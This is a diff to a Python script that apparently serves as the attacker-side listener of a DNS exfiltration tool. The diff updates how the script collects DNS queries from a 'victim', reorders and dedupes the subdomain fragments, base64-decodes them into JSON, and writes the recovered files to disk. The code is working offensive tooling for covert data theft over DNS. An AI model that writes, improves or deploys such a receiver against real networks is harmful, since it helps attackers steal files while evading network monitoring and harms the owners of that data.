@@ -2,6 +2,7 @@
 
 import socket
 import sys
+import time
 import gzip
 import json
 import re
@@ -61,14 +62,18 @@ class DNSQuery:
 
 
 def decode(data_received) -> dict:
-    stitched_data = "".join([fragment.split(".")[0] for fragment in data_received])
-    print(stitched_data)
+    ordered_data = []
 
-    # subdomain = stitched_data.split(".")[0]
+    for fragment in data_received:
+        index = int(fragment[0])
+        fragment = fragment[1:]
+        ordered_data.insert(index, fragment)
+
+    stitched_data = "".join([fragment.split(".")[0] for fragment in ordered_data])
+
     contents = json.loads(
         base64.b64decode(stitched_data.encode("utf-8") + b"===")
     )  # TODO: Dude where's my padding?
-    print(contents)
 
     for k, v in contents.items():
         with open(k, "wb+") as f:
@@ -133,26 +138,26 @@ if __name__ == "__main__":
         sys.exit(1)
 
     print(f"[+] DNS listening on {ip_address}:{port}")
-    # external_ip = urllib.request.urlopen("https://ifconfig.me").read().decode("utf-8")
     print("[+] Once files have sent, use Ctrl+C to exit and save.\n")
 
     try:
-        data_received = []
+        data_received = set()
         while True:
             # There is a bottle neck in this function, if very slow PC, will take
             # slightly longer to send as this main loop recieves the data from victim.
 
             # Listen for requests from the client
             data, addr = udp.recvfrom(1024)
+            time.sleep(1)
 
             p = DNSQuery(data)
 
-            print(p.data_text)
+            print(f"Recieved {p.data_text} from {addr}")
+
             # Send back a response
             udp.sendto(p.reply(ip_address), addr)
 
-            data_received.append(p.data_text)
-            print(data_received)
+            data_received.add(p.data_text)
 
     except KeyboardInterrupt:
         decode(data_received)
